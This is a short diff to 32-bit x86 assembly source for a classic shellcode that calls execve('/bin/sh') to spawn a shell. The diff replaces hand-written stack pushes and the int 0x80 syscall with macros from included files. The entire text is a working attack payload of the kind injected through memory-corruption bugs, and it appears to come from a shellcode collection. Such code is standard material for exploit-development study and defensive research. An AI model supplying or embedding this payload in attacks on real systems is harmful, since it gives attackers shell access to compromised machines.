@@ -3,15 +3,15 @@
 BITS 32
 global main
 	%include "short32.s"
+	%include "syscall.s"
+	%include "util.s"
 
 main:
 	; execve("/bin/sh", 0, 0)
 	xor eax, eax
 	push eax
-	push 0x68732f2f 	; "//sh" -> stack
-	push 0x6e69622f 	; "/bin" -> stack
+	PUSH_STRING "/bin//sh"
 	mov ebx, esp		; arg1 = "/bin//sh\0"
 	mov ecx, eax		; arg2 = 0
 	mov edx, eax		; arg3 = 0
-	mov al, execve
-	int 0x80
+	SYSTEM_CALL(execve)
